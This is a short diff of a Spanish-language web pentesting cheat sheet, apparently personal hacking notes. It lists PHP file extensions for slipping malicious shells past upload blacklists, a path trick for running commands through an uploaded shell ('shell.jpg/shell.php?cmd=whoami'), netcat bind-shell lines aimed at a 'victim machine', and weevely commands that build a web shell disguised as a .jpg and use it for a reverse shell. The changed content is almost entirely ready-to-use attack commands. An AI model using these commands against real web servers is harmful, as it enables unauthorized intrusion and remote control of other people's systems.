@@ -50,7 +50,6 @@ La mayoría de las paginas al momento de comprometerlas encontraremos el usuario
 
 ## Reverse / Bind Shells directamente
 
-**Rever Shell:** 
 ```bash 
 # Desde la URL de la Web (Maquina victima)
 
@@ -90,19 +89,22 @@ La mayoría de las paginas al momento de comprometerlas encontraremos el usuario
 2. ❯ nc.ex -nv IP 443                       # Ejecutamos en para completar la Bind Shell (Maquina atacante) Windows 
 ```
 
-## Reverse / Bind Shells cuando subes un archivo a la Web (Maquina victima)
+## Bypass PHPx Blacklist 
 
 ```bash 
-# Diferentes extensiones PHP para subir 'Shells' maliciosas
+# Diferentes extensiones PHP para subir 'Shells' maliciosas 
 
 * php
 * php3
 * php4
 * php5
+* php6
+* php7
 * pht
 * phtm
 * phtml
 * phar
+
 ```
 
 ## Bypass Web
@@ -113,6 +115,15 @@ La mayoría de las paginas al momento de comprometerlas encontraremos el usuario
 ❯ http://IP/uploads/shell.jpg/shell.php?cmd=whoami
 
 	# shell.jpg = Extension que nos deja subir la web
+```
+
+```bash 
+# Otra forma de evadir la subida de archivos y obtener una Revershell 
+
+❯ weevely generate password ~/Desktop/weevely.jpg     # Creamos un archivo con la extension que nos deja subir 
+❯ weevely https://IP/uploads/weevely.jpg/weevely.php password cmd   # Hara automaticamente una revershell con la peticion http request 
+	❯ :help                         # Muestra los comandos que podemos utilizar 
+	❯ :system_info                  # Muestra la info del sistema 
 ```
 
 ## RCE en Web
